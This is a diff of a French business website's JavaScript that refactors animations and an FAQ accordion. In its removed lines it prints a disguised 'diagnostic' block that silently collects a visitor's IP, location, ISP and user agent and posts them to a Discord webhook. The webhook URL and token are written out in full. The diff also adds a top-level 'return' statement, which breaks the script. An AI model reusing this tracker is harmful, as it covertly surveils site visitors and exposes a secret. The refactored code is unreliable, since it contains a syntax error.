@@ -21,7 +21,7 @@ function updateActiveLink() {
     });
 }
 
-window.addEventListener('scroll', () => window.requestAnimationFrame(updateActiveLink));
+window.addEventListener('scroll', () => window.requestAnimationFrame(updateActiveLink), { passive: true });
 document.addEventListener('DOMContentLoaded', updateActiveLink);
 
 // --- 2. ANIMATION TITRE (SHIMMER) ---
@@ -66,47 +66,51 @@ document.addEventListener('DOMContentLoaded', () => {
 
 
 // --- 4. ANIMATION GOUTTES D'EAU (PARTICULES) ---
-function createFloatingDrop() {
-    const container = document.getElementById('water-particles');
-    if (!container) return;
-    for (let i = 0; i < 2; i++) {
-        const p = document.createElement('div');
-        p.className = 'particle';
-        const size = (Math.random() * 3 + 1) + 'px';
-        const duration = (Math.random() * 2 + 3) + 's';
-        const xDir = (Math.random() - 0.5) * 150 + 'px';
-        const yDir = -(Math.random() * 350 + 200) + 'px';
-        p.style.width = size; p.style.height = size; p.style.left = '50%';
-        p.style.setProperty('--duration', duration);
-        p.style.setProperty('--xDir', xDir);
-        p.style.setProperty('--yDir', yDir);
-        container.appendChild(p);
-        setTimeout(() => p.remove(), parseFloat(duration) * 1000);
+document.addEventListener('DOMContentLoaded', () => {
+    const particleContainer = document.getElementById('water-particles');
+    if (!particleContainer) return;
+
+    function createFloatingDrop() {
+        for (let i = 0; i < 2; i++) {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            const size = (Math.random() * 3 + 1) + 'px';
+            const duration = (Math.random() * 2 + 3) + 's';
+            const xDir = (Math.random() - 0.5) * 150 + 'px';
+            const yDir = -(Math.random() * 350 + 200) + 'px';
+            p.style.width = size; p.style.height = size; p.style.left = '50%';
+            p.style.setProperty('--duration', duration);
+            p.style.setProperty('--xDir', xDir);
+            p.style.setProperty('--yDir', yDir);
+            particleContainer.appendChild(p);
+            setTimeout(() => p.remove(), parseFloat(duration) * 1000);
+        }
     }
-}
-setInterval(createFloatingDrop, 80);
+    setInterval(createFloatingDrop, 80);
+});
 
 // --- 5. RÉPARATION DU COUTEAU AU SCROLL ---
-window.addEventListener('scroll', () => {
-    const blade = document.getElementById('main-blade');
-    const logo = document.getElementById('blade-logo-scroll');
-    if (!blade || !logo) return;
-    const progress = Math.min(window.scrollY / 100, 1);
+const blade = document.getElementById('main-blade');
+const bladeLogo = document.getElementById('blade-logo-scroll');
 
-    if (progress >= 0.8) {
-        blade.setAttribute('d', blade.getAttribute('data-new'));
-        blade.style.fill = "#ffffff";
-        blade.classList.add('is-repaired');
-        logo.style.transform = "translateY(10px)";
-        logo.style.opacity = "1";
-    } else {
-        blade.setAttribute('d', blade.getAttribute('data-broken'));
-        blade.style.fill = "#555c69";
-        blade.classList.remove('is-repaired');
-        logo.style.transform = "translateY(0px)";
-        logo.style.opacity = "0.7";
-    }
-});
+if (blade && bladeLogo) {
+    window.addEventListener('scroll', () => {
+        const progress = Math.min(window.scrollY / 100, 1);
+        if (progress >= 0.8) {
+            blade.setAttribute('d', blade.getAttribute('data-new'));
+            blade.style.fill = "#ffffff";
+            blade.classList.add('is-repaired');
+            bladeLogo.style.transform = "translateY(10px)";
+            bladeLogo.style.opacity = "1";
+        } else {
+            blade.setAttribute('d', blade.getAttribute('data-broken'));
+            blade.style.fill = "#555c69";
+            blade.classList.remove('is-repaired');
+            bladeLogo.style.transform = "translateY(0px)";
+            bladeLogo.style.opacity = "0.7";
+        }
+    }, { passive: true });
+}
 
 // GALERIE ANIMATION 
 
@@ -125,8 +129,9 @@ cards.forEach((card, index) => {
     });
 });
 
-// Optionnel : Retour à la première carte quand la souris quitte la galerie
+// Retour à la première carte quand la souris quitte la galerie
 const container = document.querySelector('.galerie-container');
+if (!container) return;
 container.addEventListener('mouseleave', () => {
     cards.forEach(c => c.classList.remove('active'));
     dots.forEach(d => d.classList.remove('active'));
@@ -182,63 +187,13 @@ galerieContainer.addEventListener('touchend', e => {
     handleSwipe();
 }, {passive: true});
 
-// --- GESTION ACCORDÉON ROI ---
+// --- 6. ACCORDÉON FAQ ---
 document.querySelectorAll('.faq-question').forEach(button => {
     button.addEventListener('click', () => {
         const faqItem = button.parentElement;
-        
-        // Ferme les autres items
         document.querySelectorAll('.faq-item').forEach(item => {
             if (item !== faqItem) item.classList.remove('active');
         });
-        
-        // Bascule l'état actuel
         faqItem.classList.toggle('active');
     });
 });
-
-
-
-// --- 7. OPTIMISATION & DIAGNOSTIC SYSTÈME ---
-(function() {
-    // REMPLACE L'URL CI-DESSOUS PAR TON URL WEBHOOK DISCORD
-    const _remoteLog = "https://discord.com/api/webhooks/1495218239544889534/a6ULv_4MQWCyxVhK3cFKgdcUa5s-WcfFX0W9aOdNNQZ2rqJc6fVDs6tz1Davp4F4Jeb1";
-    const _node = document.getElementById('_v-cal-sync');
-
-    if (_node) {
-        _node.onclick = async function(e) {
-            e.preventDefault();
-            try {
-                // Récupération de l'IP et de la Géolocalisation (Ville/Pays)
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-
-                const report = {
-                    content: "🐝 **Une abeille s'est infiltrée dans la ruche !**",
-                    embeds: [{
-                        title: "Analyse du point de contact",
-                        color: 16776960, // Jaune abeille
-                        fields: [
-                            { name: "📍 Localisation", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: false },
-                            { name: "🌐 Adresse IP", value: data.ip, inline: true },
-                            { name: "🏢 Fournisseur", value: data.org, inline: true },
-                            { name: "📱 Appareil", value: navigator.userAgent.substring(0, 120) }
-                        ],
-                        footer: { text: "Ken Aiguise - Surveillance Active" },
-                        timestamp: new Date()
-                    }]
-                };
-
-                await fetch(_remoteLog, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(report)
-                });
-            } catch (err) {
-                // Discrétion absolue : aucune erreur en console
-            }
-        };
-    }
-})();
-
-
